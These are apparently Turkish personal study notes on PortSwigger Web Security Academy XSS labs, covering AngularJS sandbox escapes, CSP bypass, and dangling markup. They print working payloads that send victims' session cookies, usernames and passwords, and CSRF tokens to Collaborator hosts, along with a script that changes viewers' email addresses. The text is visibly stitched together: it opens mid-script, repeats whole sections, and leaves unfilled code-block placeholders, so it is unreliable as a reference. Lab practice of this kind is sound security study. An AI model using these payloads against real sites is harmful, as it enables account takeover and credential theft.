location='https://0a180047033462538171de49007900f7.web-security-academy.net//?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

![Pasted image 20250423184830.png](/img/user/resimler/Pasted%20image%2020250423184830.png)

2- “ `Store`” ve “`Deliver exploit to victim`” seçeneklerine tıklayın.

Exploit, CSP'yi bypass eden bir focus event oluşturmak için AngularJS'deki `ng-focus` event'ini kullanır. Ayrıca, event objesine referans veren bir AngularJS değişkeni olan `$event`'i kullanır. `Path` özelliği Chrome'a özgüdür ve event'i tetikleyen element array'ini içerir. Array'deki son element `window` objesini içerir.

Normalde, `|` JavaScript'te bitsel veya işlemidir, ancak AngularJS'de bir filtre işlemini, bu durumda `orderBy` filtresini belirtir. İki nokta üst üste, filtreye gönderilen bir argümanı belirtir. Argümanda, `alert` fonksiyonunu doğrudan çağırmak yerine, onu `z` değişkenine atıyoruz. Fonksiyon yalnızca `orderBy` işlemi `$event.path` array'indeki `window` objesine ulaştığında çağrılacaktır. Bu, `window` objesine açık bir referans olmadan `window` scope'unda çağrılabileceği ve AngularJS'nin `window` kontrolünü etkin bir şekilde atlayabileceği anlamına gelir.

---

## Client-sde template injection güvenlik açıkları nasıl önlenir

Client side template injection güvenlik açıklarını önlemek için, template veya ifade oluşturmak için güvenilmeyen kullanıcı input'larını kullanmaktan kaçının. Bu pratik değilse, template expression syntax'ını client-side template'lere yerleştirmeden önce kullanıcı input'undan filtrelemeyi düşünün.

HTML kodlamasının client side template injection saldırılarını önlemek için yeterli olmadığını unutmayın, çünkü framework'ler template ifadelerini bulmadan ve çalıştırmadan önce ilgili içeriğin HTML kodunu çözer.

----

## Exploiting cross-site scripting vulnerabilities

Bir cross-site scripting açığı bulduğunuzu kanıtlamanın geleneksel yolu `alert()` fonksiyonunu kullanarak bir popup oluşturmaktır. Bunun nedeni XSS'nin açılır pencerelerle bir ilgisi olması değildir; bu sadece belirli bir domain üzerinde rastgele JavaScript çalıştırabileceğinizi kanıtlamanın bir yoludur. Bazı kişilerin `alert(document.domain)` kullandığını fark edebilirsiniz. Bu, JavaScript'in hangi domain üzerinde çalıştırıldığını açıkça belirtmenin bir yoludur.

Bazen daha ileri gitmek ve bir XSS açığının gerçek bir tehdit olduğunu tam bir exploit sağlayarak kanıtlamak isteyebilirsiniz. Bu bölümde, bir XSS açığından yararlanmanın en popüler ve güçlü üç yolunu inceleyeceğiz.


### Cookie'leri çalmak için cross-site scripting'den yararlanma

Cookie'leri çalmak XSS'den faydalanmanın geleneksel bir yoludur. Çoğu web uygulaması session handling için cookie kullanır. Kurbanın cookie'lerini kendi domaininize göndermek için cross-site scripting güvenlik açıklarından faydalanabilir, ardından cookie'leri tarayıcıya manuel olarak enjekte edebilir ve kurbanın kimliğine bürünebilirsiniz.

Uygulamada, bu yaklaşımın bazı önemli sınırlamaları vardır.

* Kurban oturum açmamış olabilir.
* Birçok uygulama `HttpOnly` bayrağını kullanarak cookie'lerini JavaScript'ten gizler.
* Sessionlar, kullanıcının IP adresi gibi ek faktörlere kilitlenmiş olabilir.
* Oturum, siz onu ele geçiremeden zaman aşımına uğrayabilir.

---

## Lab: Exploiting cross-site scripting to steal cookies

Bu laboratuvar, blog yorumları fonksiyonunda bir stored XSS güvenlik açığı içerir. Simüle edilmiş bir kurban kullanıcı, gönderildikten sonra tüm yorumları görüntüler. Laboratuvarı çözmek için güvenlik açığından yararlanarak kurbanın session cookie'sini ele geçirin, ardından bu cookie'yi kurbanın kimliğine bürünmek için kullanın.

##### Not

Akademi platformunun üçüncü taraflara saldırmak için kullanılmasını önlemek amacıyla güvenlik duvarımız, laboratuvarlar ve rastgele external sistemler arasındaki etkileşimleri engeller. Laboratuvarı çözmek için Burp Collaborator'ın varsayılan genel sunucusunu kullanmalısınız.

Bazı kullanıcılar bu laboratuvar için Burp Collaborator gerektirmeyen alternatif bir çözüm olduğunu fark edecektir. Ancak, cookie'yi dışarı sızdırmaktan çok daha az inceliklidir.

1- Burp Suite Professional'ı kullanarak [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) sekmesine gidin.

2- Benzersiz bir Burp Collaborator payload'unu panonuza kopyalamak için “ Copy to clipboard” (Panoya kopyala) seçeneğine tıklayın.

3- Aşağıdaki payload'u Burp Collaborator subdomain'inizi belirtilen yere ekleyerek bir blog yorumunda gönderin:

```
<script>
fetch('https://oyqbe9xdu8p5v2pq3rfcpegqhhn9b0zp.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

4- Bu script, yorumu görüntüleyen herkesin herkese açık Collaborator sunucusundaki subdomain'inize cookie'lerini içeren bir POST request'i göndermesini sağlayacaktır. 

![Pasted image 20250423213720.png](/img/user/resimler/Pasted%20image%2020250423213720.png)

5- Collaborator sekmesine geri dönün ve “`Poll now` ”a tıklayın. Bir HTTP etkileşimi görmelisiniz. Listede herhangi bir etkileşim görmüyorsanız, birkaç saniye bekleyin ve tekrar deneyin.

6- POST body'sinde kurbanın cookie'sinin değerini not alın.

7- Kendi session cookie'nizi Burp Collaborator'da yakaladığınız cookie ile değiştirmek için Burp Proxy veya Burp Repeater kullanarak ana blog sayfasını yeniden yükleyin. Laboratuvarı çözmek için isteği gönderin. Admin kullanıcısının oturumunu başarıyla ele geçirdiğinizi kanıtlamak için aynı cookie'yi `/my-account` isteğinde kullanarak admin kullanıcısının hesap sayfasını yükleyebilirsiniz.

![Pasted image 20250423213740.png](/img/user/resimler/Pasted%20image%2020250423213740.png)

##### Alternatif çözüm

Alternatif olarak, CSRF gerçekleştirmek için XSS'den yararlanarak kurbanın session cookie'sini bir blog yorumu içinde yayınlamasını sağlayacak şekilde saldırıyı uyarlayabilirsiniz. Ancak bu, cookie'yi herkese açık hale getirdiği ve ayrıca saldırının gerçekleştirildiğine dair kanıtları ifşa ettiği için çok daha az inceliklidir.

```
<script>
document.querySelector('textarea').value = document.cookie;
document.querySelector('form').submit();
</script>
```

----

## Parolaları ele geçirmek için cross-site scripting'den yararlanma

Bugünlerde birçok kullanıcı şifrelerini otomatik olarak dolduran şifre yöneticilerine sahip. Bir parola girişi oluşturarak, otomatik doldurulan parolayı okuyarak ve kendi domaininize göndererek bundan yararlanabilirsiniz. Bu teknik, cookie çalma ile ilgili sorunların çoğunu ortadan kaldırır ve hatta kurbanın aynı şifreyi tekrar kullandığı diğer tüm hesaplara erişim sağlayabilir.

Bu tekniğin birincil dezavantajı, yalnızca otomatik parola doldurma işlemi gerçekleştiren bir parola yöneticisine sahip olan kullanıcılarda işe yaramasıdır. (Elbette, bir kullanıcının kayıtlı bir parolası yoksa, yerinde kimlik avı saldırısı yoluyla parolasını elde etmeye çalışabilirsiniz, ancak bu tam olarak aynı şey değildir).


---

## Laboratuvar: Parolaları ele geçirmek için cross-site scripting'den yararlanma

Bu laboratuvar, blog yorumları fonksiyonunda stored bir XSS güvenlik açığı içerir. Simüle edilmiş bir kurban kullanıcı, gönderildikten sonra tüm yorumları görüntüler. Laboratuvarı çözmek için güvenlik açığından yararlanarak kurbanın kullanıcı adı ve şifresini ele geçirin ve ardından bu kimlik bilgilerini kullanarak kurbanın hesabında oturum açın.

### Not

Akademi platformunun üçüncü taraflara saldırmak için kullanılmasını önlemek amacıyla güvenlik duvarımız, laboratuvarlar ve rastgele harici sistemler arasındaki etkileşimleri engeller. Laboratuvarı çözmek için Burp Collaborator'ın varsayılan public sunucusunu kullanmalısınız.

Bazı kullanıcılar bu laboratuvar için Burp Collaborator gerektirmeyen alternatif bir çözüm olduğunu fark edecektir. Ancak, kimlik bilgilerinin sızdırılmasından çok daha az inceliklidir.

1- Burp Suite Professional'ı kullanarak Collaborator sekmesine gidin.

2- Benzersiz bir Burp Collaborator payload'unu panonuza kopyalamak için “Panoya kopyala ”ya tıklayın.

3- Aşağıdaki payload'u, belirtilen yere Burp Collaborator subdomain'inizi ekleyerek bir blog yorumunda gönderin:

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://255pln4r1mwj2gw4a5mqwsn4ovuoie63.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

Bu script, yorumu görüntüleyen herkesin public Collaborator sunucusundaki subdomain'inize kullanıcı adı ve şifresini içeren bir POST isteği göndermesini sağlayacaktır.

4- Collaborator sekmesine geri dönün ve “Poll now ”a tıklayın. Bir HTTP etkileşimi görmelisiniz. Listede herhangi bir etkileşim görmüyorsanız, birkaç saniye bekleyin ve tekrar deneyin.

5- POST body'sindeki kurbanın kullanıcı adı ve şifresinin değerini not edin.

6- Kurban kullanıcı olarak oturum açmak için bilgileri kullanın.

![Pasted image 20250423224003.png](/img/user/resimler/Pasted%20image%2020250423224003.png)


Alternatif çözüm

Alternatif olarak, [CSRF gerçekleştirmek için XSS'den yararlanarak](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf) kurbanın kimlik bilgilerini bir blog yorumunda yayınlamasını sağlamak için saldırıyı uyarlayabilirsiniz. Ancak bu, kullanıcı adı ve parolayı herkese açık hale getirdiği ve ayrıca saldırının gerçekleştirildiğine dair kanıtları ifşa ettiği için çok daha az inceliklidir.


---

## CSRF korumalarını atlamak için cross-site scripting'den yararlanma

XSS, bir saldırganın legal bir kullanıcının bir web sitesinde yapabileceği neredeyse her şeyi yapmasını sağlar. XSS, kurbanın tarayıcısında rastgele JavaScript çalıştırarak, sanki kurban kullanıcıymışsınız gibi çok çeşitli eylemler gerçekleştirmenize olanak tanır. Örneğin, bir kurbanın bir mesaj göndermesini, bir arkadaşlık isteğini kabul etmesini, bir kaynak kodu deposuna bir backdoor açmasını veya bir miktar Bitcoin transfer etmesini sağlayabilirsiniz.

Bazı web siteleri, giriş yapan kullanıcıların şifrelerini yeniden girmeden e-posta adreslerini değiştirmelerine izin verir. Bu sitelerden birinde bir XSS açığı bulduysanız, bu açıktan yararlanarak bir CSRF tokenı çalabilirsiniz. Token ile kurbanın e-posta adresini kontrol ettiğiniz bir adresle değiştirebilirsiniz. Daha sonra hesaba erişim kazanmak için bir parola sıfırlama işlemini tetikleyebilirsiniz.

Bu tür bir exploit, XSS (CSRF token'ını çalmak için) ile CSRF tarafından tipik olarak hedeflenen fonksiyonelliği birleştirir. Geleneksel CSRF, saldırganın kurbanı istek göndermeye teşvik edebildiği ancak yanıtları göremediği “tek yönlü” bir güvenlik açığı iken, XSS “iki yönlü” iletişim sağlar. Bu da saldırganın hem keyfi talepler göndermesini hem de yanıtları okumasını sağlayarak CSRF karşıtı savunmaları atlatan hibrit bir saldırıya yol açar.

### Not

CSRF tokenları XSS'ye karşı etkisizdir çünkü XSS saldırganların token değerlerini doğrudan yanıtlardan okumasına izin verir.

----

## Lab: Exploiting XSS to bypass CSRF defenses

Bu laboratuvar, blog yorumları işlevinde stored bir XSS güvenlik açığı içerir. Laboratuvarı çözmek için, bir CSRF token'ı çalmak için güvenlik açığından yararlanın, daha sonra bunu blog yazısı yorumlarını görüntüleyen birinin e-posta adresini değiştirmek için kullanabilirsiniz.

Aşağıdaki kimlik bilgilerini kullanarak kendi hesabınıza giriş yapabilirsiniz: `wiener:peter`

1- Sağlanan kimlik bilgilerini kullanarak giriş yapın. Kullanıcı hesabı sayfanızda, e-posta adresinizi güncelleme fonksiyonuna dikkat edin.

2- Sayfanın kaynağını görüntülerseniz aşağıdaki bilgileri görürsünüz:

* `email` adında bir parametre ile `/my-account/change-email` adresine bir POST request'i göndermeniz gerekir.

* `token` adlı gizli bir input içinde bir anti-CSRF token'ı var.

Bu, exploit'inizin kullanıcı hesabı sayfasını yüklemesi, CSRF token'ını çıkarması ve ardından kurbanın e-posta adresini değiştirmek için token'ı kullanması gerektiği anlamına gelir.

3- Aşağıdaki payload'u bir blog yorumunda gönderin:

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

![Pasted image 20250423224851.png](/img/user/resimler/Pasted%20image%2020250423224851.png)

4- Bu, yorumu görüntüleyen herkesin e-posta adresini `test@test.com` olarak değiştirmek için bir POST isteği göndermesini sağlayacaktır.

----

## Dangling markup injection

Bu bölümde, dangling markup injection'ı, tipik bir exploit'in nasıl çalıştığını ve dangling markup saldırılarının nasıl önleneceğini açıklayacağız.

### Dangling markup injection nedir?

Dangling markup injection, tam bir cross-site scripting saldırısının mümkün olmadığı durumlarda cross-domain veri yakalamaya yönelik bir tekniktir.

Bir uygulamanın saldırgan tarafından kontrol edilebilen verileri yanıtlarına güvenli olmayan bir şekilde yerleştirdiğini varsayalım:

```
<input type="text" name="input" value="KONTROL EDILEBILIR VERILER BURADA
```

Ayrıca uygulamanın `>` veya `"` karakterlerini filtrelemediğini veya escape yapmadığını varsayalım. Bir saldırgan, tırnak içine alınmış attribute değerinden ve çevreleyen tag'den çıkmak ve bir HTML context'ine dönmek için aşağıdaki sözdizimini kullanabilir:

```
">
```

Bu durumda, bir saldırgan doğal olarak XSS gerçekleştirmeye çalışacaktır. Ancak input filtreleri, content security policy ya da diğer engeller nedeniyle normal bir XSS saldırısının mümkün olmadığını varsayalım. Burada, aşağıdaki gibi bir payload kullanarak dangling markup injection saldırısı gerçekleştirmek hala mümkün olabilir:

```
"><img src='//attacker-website.com?
```

Bu payload bir `img` tagı oluşturur ve saldırganın sunucusunda bir URL içeren bir `src` attribute'unun başlangıcını tanımlar. Saldırganın payload'unun `src` attribute'unu kapatmadığına ve “ dangling” olarak bıraktığına dikkat edin. Bir tarayıcı yanıtı çözümlediğinde, attribute'u sonlandırmak için tek bir tırnak işaretiyle karşılaşana kadar ileriye bakacaktır. Bu karaktere kadar olan her şey URL'nin bir parçası olarak kabul edilecek ve URL query string içinde saldırganın sunucusuna gönderilecektir. Yeni satırlar da dahil olmak üzere alfanümerik olmayan tüm karakterler URL ile kodlanacaktır.

Saldırının sonucu, saldırganın enjeksiyon noktasını takiben uygulamanın yanıtının hassas veriler içerebilecek bir kısmını yakalayabilmesidir. Uygulamanın işlevselliğine bağlı olarak, bu CSRF token'larını, e-posta mesajlarını veya finansal verileri içerebilir.

External istek yapan herhangi bir attribute dangling markup için kullanılabilir.

Tüm external request'ler engellendiği için bir sonraki laboratuvarı çözmek zordur. Ancak, verileri depolamanıza ve daha sonra external bir sunucudan almanıza olanak tanıyan belirli tag'ler vardır. Bu laboratuvarı çözmek kullanıcı etkileşimi gerektirebilir.

---

## Laboratuvar: Dangling markup saldırısı ile çok katı CSP tarafından korunan reflected XSS

Bu laboratuvarda, external web sitelerine giden requestleri engelleyen katı bir CSP kullanılmaktadır.

Laboratuvarı çözmek için önce CSP'yi atlayan ve Burp Collaborator kullanarak simüle edilmiş bir kurban kullanıcının CSRF token'ını dışarı sızdıran bir cross-site scripting saldırısı gerçekleştirin. Daha sonra simüle edilen kullanıcının e-posta adresini `hacker@evil-user.net` olarak değiştirmeniz gerekir.

Simüle edilen kullanıcıyı tıklamaya teşvik etmek için vektörünüzü “ Click” kelimesi ile etiketlemelisiniz. Örneğin:

```
<a href="">Click me</a>
```

Aşağıdaki kimlik bilgilerini kullanarak kendi hesabınıza giriş yapabilirsiniz: `wiener:peter`


1- Yukarıda verilen hesabı kullanarak laboratuvarda oturum açın.

2- E-posta değiştir fonksiyonunu inceleyin. E-posta parametresinde bir XSS güvenlik açığı olduğunu gözlemleyin.

3- Collaborator sekmesine gidin.

4- Benzersiz bir Burp Collaborator yükünü panonuza kopyalamak için “Panoya kopyala ”ya tıklatın.

5- Laboratuvara geri dönün, exploit sunucusuna gidin ve aşağıdaki kodu ekleyin, `YOUR-LAB-ID` ve `YOUR-EXPLOIT-SERVER-ID`'yi sırasıyla laboratuvar kimliğiniz ve exploit sunucu kimliğinizle değiştirin ve `YOUR-COLLABORATOR-ID`'yi Burp Collaborator'dan kopyaladığınız payload ile değiştirin.

```
<script>
if(window.name) {
    new Image().src='//8t2v9tsxpskpqmkaybawkybac1ix6oud.oastify.net?'+encodeURIComponent(window.name);
} else {
    location = 'https://0a8600e0036407648050cb5a000f00a8.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a2200b0034007b8808bca2601af00bc.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

6- “`Store`” ve ardından “`Deliver exploit to victim`” seçeneğine tıklayın. Kullanıcı bu kötü amaçlı komut dosyasını içeren web sitesini ziyaret ettiğinde, laboratuvar web sitesinde hala oturum açmış durumdayken “ `Click me`” bağlantısına tıklarsa, tarayıcısı kötü amaçlı web sitenize CSRF token'ını içeren bir istek gönderecektir. Daha sonra Burp Collaborator kullanarak bu CSRF token'ını çalabilirsiniz.

7- Collaborator sekmesine geri dönün ve “ `Poll now`” seçeneğine tıklayın. Listede herhangi bir etkileşim göremiyorsanız, birkaç saniye bekleyin ve tekrar deneyin. Uygulama tarafından başlatılan bir HTTP etkileşimi görmelisiniz. HTTP etkileşimini seçin, istek sekmesine gidin ve kullanıcının CSRF token'ını kopyalayın.

8- Burp'un Intercept özelliği açıkken, laboratuvarın e-posta değiştirme işlevine geri dönün ve e-postayı rastgele bir adresle değiştirmek için bir istek gönderin.

9- Burp'ta, durdurulan talebe gidin ve e-posta parametresinin değerini `hacker@evil-user.net` olarak değiştirin.

10 - İsteğe sağ tıklayın ve context menüsünden “`Engagement tools`” ve ardından “`Generate CSRF PoC`” öğesini seçin. Açılır pencere hem request'i hem de onun tarafından oluşturulan CSRF HTML'sini gösterir. Talepte, CSRF token'ını daha önce kurbandan çaldığınız token ile değiştirin.

11 - “ `Options` ”a tıklayın ve “`Include auto-submit script`” seçeneğinin aktif olduğundan emin olun.

12- CSRF HTML'sini çalınan token'ı içerecek şekilde güncellemek için “ Regenerate” (Yeniden Oluştur) seçeneğine tıklayın, ardından panoya kaydetmek için “Copy HTML” (HTML Kopyala) seçeneğine tıklayın.

13- Request'i drop edin ve intercept özelliğini kapatın.

14- Exploit sunucusuna geri dönün ve CSRF HTML'sini body'ye yapıştırın. Daha önce girdiğimiz script'in üzerine yazabilirsiniz.

15- “Store” ve “Deliver exploit to victim” seçeneklerine tıklayın. Kullanıcının e-postası `hacker@evil-user.net` olarak değiştirilecektir.


Çözümünü yarın yaz .

---

## Dangling markup saldırıları nasıl önlenir

Dangling markup saldırılarını, çıktıdaki verileri kodlayarak ve girişteki girdiyi doğrulayarak, [cross-site scripting'i önlemek](https://portswigger.net/web-security/cross-site-scripting/preventing) için aynı genel savunmaları kullanarak önleyebilirsiniz.

[content security policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) (CSP) kullanarak da bazı dangling markup saldırılarını azaltabilirsiniz. Örneğin, img gibi tag'lerin external kaynakları yüklemesini engelleyen bir politika kullanarak bazı (ama hepsini değil) saldırıları önleyebilirsiniz.

Not

Chrome tarayıcısı, `img` gibi tag'lerin köşeli parantez ve newline gibi ham karakterler içeren URL'leri tanımlamasını engelleyerek dangling markup saldırılarının üstesinden gelmeye karar vermiştir. Bu, saldırıları önleyecektir çünkü aksi takdirde elde edilecek veriler genellikle bu raw karakterleri içerecektir, böylece saldırı engellenir.


## Content security policy

Burada kaldım xxe saldırılarına geçtim ..

);
}
isIdent('x9=9a9l9e9r9t9(919)')
```

`isIdent()` fonksiyonu aldatıldığında, kötü amaçlı JavaScript enjekte edebilirsiniz. Örneğin, `$eval(‘x=alert(1)’)` gibi bir ifadeye izin verilebilir çünkü AngularJS her karakteri bir identifier olarak ele alır. AngularJS'nin `$eval()` fonksiyonunu kullanmamız gerektiğini unutmayın, çünkü `charAt()` fonksiyonunun üzerine yazmak yalnızca sandbox'lı kod yürütüldüğünde etkili olacaktır. Bu teknik daha sonra sandbox'ı atlayacak ve keyfi JavaScript yürütülmesine izin verecektir. [PortSwigger Research, AngularJS sandbox'ını kapsamlı bir şekilde, birden çok kez kırmıştır](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs).


### Gelişmiş bir AngularJS sandbox escape oluşturma

Temel bir sandbox escape'in nasıl çalıştığını öğrendiniz, ancak hangi karakterlere izin verdikleri konusunda daha kısıtlayıcı olan sitelerle karşılaşabilirsiniz. Örneğin, bir site çift veya tek tırnak işareti kullanmanızı engelleyebilir. Bu durumda, karakterlerinizi oluşturmak için `String.fromCharCode()` gibi fonksiyonları kullanmanız gerekir. AngularJS bir expression içinde `String` constructor'a erişimi engellese de, bunun yerine bir string'in constructor özelliğini kullanarak bunu aşabilirsiniz. Bu açıkça bir string gerektirir, bu nedenle böyle bir saldırı oluşturmak için tek veya çift tırnak kullanmadan bir string oluşturmanın bir yolunu bulmanız gerekir.

Standart bir sandbox escape'te, JavaScript payload'unuzu çalıştırmak için `$eval()` fonksiyonunu kullanırsınız, ancak aşağıdaki laboratuvarda `$eval()` fonksiyonu tanımsızdır. Neyse ki, bunun yerine `orderBy` filtresini kullanabiliriz. Bir `orderBy` filtresinin tipik sözdizimi aşağıdaki gibidir:

{{CODE_BLOCK_113}}

`|` operatörünün JavaScript'tekinden farklı bir anlamı olduğuna dikkat edin. Normalde, bu bir bitsel `OR` işlemidir, ancak AngularJS'de bir filtre işlemini belirtir. Yukarıdaki kodda, soldaki `[123]` array'ini sağdaki `orderBy` filtresine gönderiyoruz. İki nokta üst üste, bu durumda bir string olan filtreye gönderilecek bir argümanı belirtir. `orderBy` filtresi normalde bir objeyi sıralamak için kullanılır, ancak aynı zamanda bir ifadeyi de kabul eder, bu da onu bir payload iletmek için kullanabileceğimiz anlamına gelir.

Artık bir sonraki laboratuvarın üstesinden gelmek için ihtiyacınız olan tüm araçlara sahip olmalısınız.

----

## Laboratuvar: AngularJS sandbox escape ile stringler olmadan Reflected XSS

Bu laboratuvar, AngularJS'yi `$eval` fonksiyonunun kullanılamadığı alışılmadık bir şekilde kullanır ve AngularJS'de herhangi bir string kullanamazsınız.

Laboratuvarı çözmek için, sandbox'tan kaçan ve `$eval` fonksiyonunu kullanmadan `alert` fonksiyonunu çalıştıran bir cross-site scripting saldırısı gerçekleştirin.

Hızlı Çözüm : 

1- `YOUR-LAB-ID` yerine laboratuvar kimliğinizi yazarak aşağıdaki URL'yi ziyaret edin:

{{CODE_BLOCK_114}}

![Pasted image 20250423182417.png](/img/user/resimler/Pasted%20image%2020250423182417.png)

![Pasted image 20250423182442.png](/img/user/resimler/Pasted%20image%2020250423182442.png)

Exploit, tırnak işareti kullanmadan bir `string` oluşturmak için `toString()` fonksiyonunu kullanır. Daha sonra String prototipini alır ve her string için `charAt` fonksiyonunun üzerine yazar. Bu, AngularJS sandbox'ını etkili bir şekilde kırar. Ardından, `orderBy` filtresine bir array aktarılır. Daha sonra bir string oluşturmak için yine `toString()` ve `String` constructor özelliğini kullanarak filtre için argümanı ayarlarız. Son olarak, `fromCharCode` yöntemini kullanarak karakter kodlarını `x=alert(1)` stringine dönüştürerek payload'umuzu oluşturuyoruz. `charAt` fonksiyonunun üzerine yazıldığı için, AngularJS normalde izin vermeyeceği bu koda izin verecektir.

---

### AngularJS CSP bypass nasıl çalışır?

Content security policy (CSP) bypass'ları standart sandbox escape'lerine benzer şekilde çalışır, ancak genellikle bazı HTML enjeksiyonları içerir. AngularJS'de CSP modu etkin olduğunda, template ifadelerini farklı şekilde parse eder ve `Function` constructor'ı kullanmaktan kaçınır. Bu, yukarıda açıklanan standart sandbox escape'in artık çalışmayacağı anlamına gelir.

Belirli politikaya bağlı olarak, CSP JavaScript event'lerini engelleyecektir. Ancak, AngularJS bunun yerine kullanılabilecek kendi event'lerini tanımlar. Bir event içindeyken AngularJS, basitçe tarayıcı event objesine referans veren özel bir `$event` objesi tanımlar. Bu objeyi CSP bypass'ı gerçekleştirmek için kullanabilirsiniz. Chrome'da, `" $event/event "` objesinde `path` adında özel bir özellik vardır. Bu özellik, event'in yürütülmesine neden olan bir array obje içerir. Son özellik her zaman bir sandbox escape gerçekleştirmek için kullanabileceğimiz `window` objesidir. Bu array'i orderBy filtresine geçirerek, array'i numaralandırabilir ve `alert()` gibi global bir fonksiyonu çalıştırmak için son elemanı (`window` object) kullanabiliriz. Aşağıdaki kod bunu göstermektedir:

{{CODE_BLOCK_115}}

Bir objeyi bir array'e dönüştürmenize ve bu array'in her elemanı üzerinde belirli bir fonksiyonu (ikinci argümanda belirtilen) çağırmanıza olanak tanıyan `from()` fonksiyonunun kullanıldığına dikkat edin. Bu durumda `alert()` fonksiyonunu çağırıyoruz. Fonksiyonu doğrudan çağıramayız çünkü AngularJS sandbox kodu parse eder ve `window` objesinin bir fonksiyon çağırmak için kullanıldığını tespit eder. Bunun yerine from() fonksiyonunu kullanmak, `window` objesini sandbox'tan etkili bir şekilde gizleyerek kötü amaçlı kod eklememize olanak tanır.

[PortSwigger Research, bu tekniği kullanarak 56 karakterde AngularJS kullanarak bir CSP baypası oluşturdu.](https://portswigger.net/research/angularjs-csp-bypass-in-56-characters)


### AngularJS sandbox escape ile bir CSP'yi bypass etme

Sıradaki laboratuvar bir uzunluk kısıtlaması kullanmaktadır, bu nedenle yukarıdaki vektör çalışmayacaktır. Bu laboratuvardan yararlanmak için, `window` objesini AngularJS sandbox'ından gizlemenin çeşitli yollarını düşünmeniz gerekir. Bunu yapmanın bir yolu `array.map()` fonksiyonunu aşağıdaki gibi kullanmaktır:

{{CODE_BLOCK_116}}

`map()` bir fonksiyonu argüman olarak kabul eder ve array'deki her item için onu çağırır. Bu, `alert()` fonksiyonuna yapılan referans `window`'a açıkça referans verilmeden kullanıldığından sandbox'ı atlayacaktır. Laboratuvarı çözmek için, `alert()` fonksiyonunu AngularJS'nin `window` detection özelliğini tetiklemeden çalıştırmanın çeşitli yollarını deneyin.

---

## Lab: Reflected XSS with AngularJS sandbox escape and CSP

Bu laboratuvarda CSP ve AngularJS kullanılmaktadır.

Laboratuvarı çözmek için CSP'yi baypas eden, AngularJS sandbox'ından kaçan ve document.cookie'yi alert eden bir cross-site scripting saldırısı gerçekleştirin.

1- Exploit sunucusuna gidin ve aşağıdaki kodu YOUR-LAB-ID yerine laboratuvar kimliğinizi yazarak yapıştırın:

{{CODE_BLOCK_117}}

![Pasted image 20250423184830.png](/img/user/resimler/Pasted%20image%2020250423184830.png)

2- “ `Store`” ve “`Deliver exploit to victim`” seçeneklerine tıklayın.

Exploit, CSP'yi bypass eden bir focus event oluşturmak için AngularJS'deki `ng-focus` event'ini kullanır. Ayrıca, event objesine referans veren bir AngularJS değişkeni olan `$event`'i kullanır. `Path` özelliği Chrome'a özgüdür ve event'i tetikleyen element array'ini içerir. Array'deki son element `window` objesini içerir.

Normalde, `|` JavaScript'te bitsel veya işlemidir, ancak AngularJS'de bir filtre işlemini, bu durumda `orderBy` filtresini belirtir. İki nokta üst üste, filtreye gönderilen bir argümanı belirtir. Argümanda, `alert` fonksiyonunu doğrudan çağırmak yerine, onu `z` değişkenine atıyoruz. Fonksiyon yalnızca `orderBy` işlemi `$event.path` array'indeki `window` objesine ulaştığında çağrılacaktır. Bu, `window` objesine açık bir referans olmadan `window` scope'unda çağrılabileceği ve AngularJS'nin `window` kontrolünü etkin bir şekilde atlayabileceği anlamına gelir.

---

## Client-sde template injection güvenlik açıkları nasıl önlenir

Client side template injection güvenlik açıklarını önlemek için, template veya ifade oluşturmak için güvenilmeyen kullanıcı input'larını kullanmaktan kaçının. Bu pratik değilse, template expression syntax'ını client-side template'lere yerleştirmeden önce kullanıcı input'undan filtrelemeyi düşünün.

HTML kodlamasının client side template injection saldırılarını önlemek için yeterli olmadığını unutmayın, çünkü framework'ler template ifadelerini bulmadan ve çalıştırmadan önce ilgili içeriğin HTML kodunu çözer.

----

## Exploiting cross-site scripting vulnerabilities

Bir cross-site scripting açığı bulduğunuzu kanıtlamanın geleneksel yolu `alert()` fonksiyonunu kullanarak bir popup oluşturmaktır. Bunun nedeni XSS'nin açılır pencerelerle bir ilgisi olması değildir; bu sadece belirli bir domain üzerinde rastgele JavaScript çalıştırabileceğinizi kanıtlamanın bir yoludur. Bazı kişilerin `alert(document.domain)` kullandığını fark edebilirsiniz. Bu, JavaScript'in hangi domain üzerinde çalıştırıldığını açıkça belirtmenin bir yoludur.

Bazen daha ileri gitmek ve bir XSS açığının gerçek bir tehdit olduğunu tam bir exploit sağlayarak kanıtlamak isteyebilirsiniz. Bu bölümde, bir XSS açığından yararlanmanın en popüler ve güçlü üç yolunu inceleyeceğiz.


### Cookie'leri çalmak için cross-site scripting'den yararlanma

Cookie'leri çalmak XSS'den faydalanmanın geleneksel bir yoludur. Çoğu web uygulaması session handling için cookie kullanır. Kurbanın cookie'lerini kendi domaininize göndermek için cross-site scripting güvenlik açıklarından faydalanabilir, ardından cookie'leri tarayıcıya manuel olarak enjekte edebilir ve kurbanın kimliğine bürünebilirsiniz.

Uygulamada, bu yaklaşımın bazı önemli sınırlamaları vardır.

* Kurban oturum açmamış olabilir.
* Birçok uygulama `HttpOnly` bayrağını kullanarak cookie'lerini JavaScript'ten gizler.
* Sessionlar, kullanıcının IP adresi gibi ek faktörlere kilitlenmiş olabilir.
* Oturum, siz onu ele geçiremeden zaman aşımına uğrayabilir.

---

## Lab: Exploiting cross-site scripting to steal cookies

Bu laboratuvar, blog yorumları fonksiyonunda bir stored XSS güvenlik açığı içerir. Simüle edilmiş bir kurban kullanıcı, gönderildikten sonra tüm yorumları görüntüler. Laboratuvarı çözmek için güvenlik açığından yararlanarak kurbanın session cookie'sini ele geçirin, ardından bu cookie'yi kurbanın kimliğine bürünmek için kullanın.

##### Not

